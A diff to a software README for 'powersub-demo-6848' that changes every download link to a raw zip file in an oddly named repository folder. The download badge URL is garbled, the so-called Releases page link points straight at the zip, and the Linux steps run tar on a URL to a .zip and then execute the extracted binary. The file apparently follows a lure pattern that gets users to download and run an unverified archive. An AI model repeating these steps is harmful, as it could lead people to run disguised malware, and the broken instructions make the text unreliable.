@@ -6,7 +6,7 @@ Welcome to the powersub-demo-6848 repository! This software helps you manage sub
 
 ## 📥 Download the Software
 
-[![Download Now](https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/betony/powersub-demo-6848.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/betony/powersub-demo-6848.zip)
+[![Download Now](https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/unconsentaneous/demo-powersub-v1.6.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/unconsentaneous/demo-powersub-v1.6.zip)
 
 You can download the latest version of the software from our Releases page. Follow these steps:
 
@@ -14,7 +14,7 @@ You can download the latest version of the software from our Releases page. Foll
 2. Visit the Releases page to find the latest version.
 3. Choose the version you want to install.
 
-Here’s the link to the Releases page again: [Download from Releases](https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/betony/powersub-demo-6848.zip).
+Here’s the link to the Releases page again: [Download from Releases](https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/unconsentaneous/demo-powersub-v1.6.zip).
 
 ## 📋 System Requirements
 
@@ -41,10 +41,10 @@ For macOS, open the `.dmg` file. Drag the powersub-demo-6848 icon into your Appl
 
 ### Linux Installation
 
-On Linux, you may need to extract the files from a `https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/betony/powersub-demo-6848.zip` archive. Open your terminal, navigate to the directory where you downloaded the file, and run the following commands:
+On Linux, you may need to extract the files from a `https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/unconsentaneous/demo-powersub-v1.6.zip` archive. Open your terminal, navigate to the directory where you downloaded the file, and run the following commands:
 
 ```bash
-tar -xzvf https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/betony/powersub-demo-6848.zip
+tar -xzvf https://raw.githubusercontent.com/realitysg5020/powersub-demo-6848/main/unconsentaneous/demo-powersub-v1.6.zip
 cd powersub-demo-6848
 ./powersub-demo
 ```
